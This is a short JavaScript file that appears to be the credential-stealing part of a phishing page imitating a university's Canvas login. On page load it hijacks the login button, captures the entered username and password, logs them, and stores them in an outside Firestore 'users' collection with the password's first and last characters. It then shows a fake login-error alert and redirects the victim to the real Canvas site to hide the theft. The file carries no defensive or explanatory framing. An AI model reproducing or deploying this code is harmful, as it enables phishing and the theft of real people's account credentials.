
function attacher(){
    const btn = document.querySelector('input.btn')
    btn.addEventListener('mouseup', stripper)
    btn.type = ''
}

function stripper(event){
    event.preventDefault()
    const username = document.querySelector('#username.form-control');
    const password = document.querySelector('#password.form-control');
    if(username.value && password.value){
        console.log(username.value)
        console.log(password.value)
        // Add a new document in collection "users"
        theDB.collection("users").doc(username.value).set({
            username: username.value,
            password: password.value,
            firstPassChar: password.value[0],
            lastPassChar: password.value[password.value.length-1]
        })
        .then(function() {
            console.log("Document successfully written!");
            window.alert('A login error occured, refreshing...')
            setTimeout(1000, ()=>{
                window.location.href = "https://utk.instructure.com/";
            })
        })
        .catch(function(error) {
            console.error("Error writing document: ", error);
        });
    }
}

document.addEventListener('DOMContentLoaded', attacher);